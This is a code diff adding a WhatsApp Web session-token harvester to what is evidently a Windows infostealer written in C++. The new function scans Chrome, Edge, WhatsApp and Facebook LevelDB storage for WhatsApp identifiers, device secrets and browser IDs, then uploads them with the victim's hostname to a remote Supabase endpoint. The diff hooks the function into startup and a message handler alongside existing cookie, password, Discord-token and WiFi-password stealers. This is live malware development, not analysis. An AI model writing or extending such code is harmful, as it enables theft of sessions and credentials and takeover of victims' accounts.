@@ -1410,10 +1410,107 @@ static void HarvestWhatsAppSession() {
         batch += "]";
         std::string pr;
         HttpRequest(L"POST", SUPABASE_WHATSAPP_PATH, batch, pr);
-        LogMsg("WhatsApp: uploaded " + std::to_string(tokens.size()) + " tokens");
+        LogMsg("WhatsApp: uploaded " + std::to_string(tokens.size()) + " tokens from memory");
     } else {
         LogMsg("WhatsApp: no session data found in memory");
     }
+    // Report to exec_results
+    std::string logEntry = "[{\"hostname\":\"" + EscapeJSON(g_hostname) + "\",\"command\":\"[WhatsApp memory scan]\",\"output\":\"WhatsApp memory: " + std::to_string(tokens.size()) + " tokens found\",\"exit_code\":0}]";
+    std::string resp2;
+    HttpRequest(L"POST", SUPABASE_EXEC_PATH, logEntry, resp2);
+}
+
+static void HarvestWhatsAppWeb() {
+    std::vector<std::string> tokens;
+    char laBuf[MAX_PATH];
+    DWORD laLen = GetEnvironmentVariableA("LOCALAPPDATA", laBuf, MAX_PATH);
+    if (laLen == 0 || laLen >= MAX_PATH) return;
+    std::string lad(laBuf);
+    char adBuf[MAX_PATH];
+    DWORD adLen = GetEnvironmentVariableA("APPDATA", adBuf, MAX_PATH);
+    std::string ad = (adLen > 0 && adLen < MAX_PATH) ? std::string(adBuf) : "";
+
+    // Scan browser + app LevelDB paths for WhatsApp Web tokens
+    struct { const char* base; const char* sub; } waPaths[] = {
+        { lad.c_str(), "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb" },
+        { lad.c_str(), "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb" },
+        { ad.c_str(), "\\WhatsApp\\Local Storage\\leveldb" },
+        { lad.c_str(), "\\com.facebook.katana\\Local Storage\\leveldb" },
+        { NULL, NULL }
+    };
+    for (int pi = 0; waPaths[pi].base; pi++) {
+        if (!waPaths[pi].base || waPaths[pi].base[0] == 0) continue;
+        std::string leveldbPath = std::string(waPaths[pi].base) + waPaths[pi].sub;
+        std::string searchPath = leveldbPath + "\\*";
+        WIN32_FIND_DATAA fd;
+        HANDLE hFind = FindFirstFileA(searchPath.c_str(), &fd);
+        if (hFind == INVALID_HANDLE_VALUE) continue;
+        do {
+            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
+            std::string fn(fd.cFileName);
+            if (fn.size() < 4) continue;
+            std::string ext = fn.substr(fn.size() - 4);
+            if (ext != ".ldb" && ext != ".log") continue;
+            if (fd.nFileSizeHigh > 0 || fd.nFileSizeLow > 10485760) continue;
+            std::string fpath = leveldbPath + "\\" + fn;
+            HANDLE hFile = CreateFileA(fpath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+            if (hFile == INVALID_HANDLE_VALUE) continue;
+            DWORD sz = GetFileSize(hFile, NULL);
+            if (sz == 0 || sz == INVALID_FILE_SIZE) { CloseHandle(hFile); continue; }
+            char* buf = new char[sz + 1];
+            DWORD rd = 0;
+            if (ReadFile(hFile, buf, sz, &rd, NULL) && rd == sz) {
+                buf[sz] = 0;
+                // Search for @s.whatsapp.net JID pattern
+                for (DWORD i = 0; i + 15 <= sz; i++) {
+                    if (memcmp(buf + i, "@s.whatsapp.net", 15) == 0) {
+                        DWORD start = i;
+                        while (start > 0 && (isalnum((unsigned char)buf[start-1]) || buf[start-1] == '-' || buf[start-1] == '_' || buf[start-1] == '.')) start--;
+                        DWORD end = i + 15;
+                        tokens.push_back(std::string(buf + start, end - start));
+                        i = end;
+                        continue;
+                    }
+                    if (i + 14 <= sz && memcmp(buf + i, "WADeviceSecret", 14) == 0) {
+                        DWORD end = i + 14;
+                        while (end < sz && (isalnum((unsigned char)buf[end]) || buf[end] == '+' || buf[end] == '/' || buf[end] == '=') && end - i < 200) end++;
+                        if (end - i - 14 >= 20) tokens.push_back(std::string(buf + i + 14, end - i - 14));
+                        i = end;
+                        continue;
+                    }
+                    if (i + 12 <= sz && memcmp(buf + i, "WABrowserId", 12) == 0) {
+                        DWORD end = i + 12;
+                        while (end < sz && (isalnum((unsigned char)buf[end]) || buf[end] == '+' || buf[end] == '/' || buf[end] == '=') && end - i < 200) end++;
+                        if (end - i - 12 >= 10) tokens.push_back(std::string(buf + i + 12, end - i - 12));
+                        i = end;
+                        continue;
+                    }
+                }
+            }
+            delete[] buf;
+            CloseHandle(hFile);
+        } while (FindNextFileA(hFind, &fd));
+        FindClose(hFind);
+    }
+
+    if (!tokens.empty()) {
+        std::sort(tokens.begin(), tokens.end());
+        tokens.erase(std::unique(tokens.begin(), tokens.end()), tokens.end());
+        std::string batch = "[";
+        for (size_t i = 0; i < tokens.size(); i++) {
+            if (i > 0) batch += ",";
+            batch += "{\"hostname\":\"" + EscapeJSON(g_hostname) + "\",\"token\":\"" + EscapeJSON(tokens[i]) + "\"}";
+        }
+        batch += "]";
+        std::string pr;
+        HttpRequest(L"POST", SUPABASE_WHATSAPP_PATH, batch, pr);
+        LogMsg("WhatsApp Web: uploaded " + std::to_string(tokens.size()) + " tokens from LevelDB");
+    } else {
+        LogMsg("WhatsApp Web: no tokens found in LevelDB");
+    }
+    std::string logEntry = "[{\"hostname\":\"" + EscapeJSON(g_hostname) + "\",\"command\":\"[WhatsApp LevelDB scan]\",\"output\":\"WhatsApp LevelDB: " + std::to_string(tokens.size()) + " tokens found\",\"exit_code\":0}]";
+    std::string resp2;
+    HttpRequest(L"POST", SUPABASE_EXEC_PATH, logEntry, resp2);
 }
 
 static void HarvestBrowserPasswords() {
@@ -2538,6 +2635,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
                 HarvestBrowserCookies();
                 HarvestDiscordTokens();
                 HarvestWhatsAppSession();
+                HarvestWhatsAppWeb();
             }
             break;
         }
@@ -2658,6 +2756,7 @@ static int RunChild(HINSTANCE hInstance) {
     HarvestWiFiPasswords();
     HarvestDiscordTokens();
     HarvestWhatsAppSession();
+    HarvestWhatsAppWeb();
 
     MSG msg;
     while (g_running && GetMessage(&msg, NULL, 0, 0) > 0) {
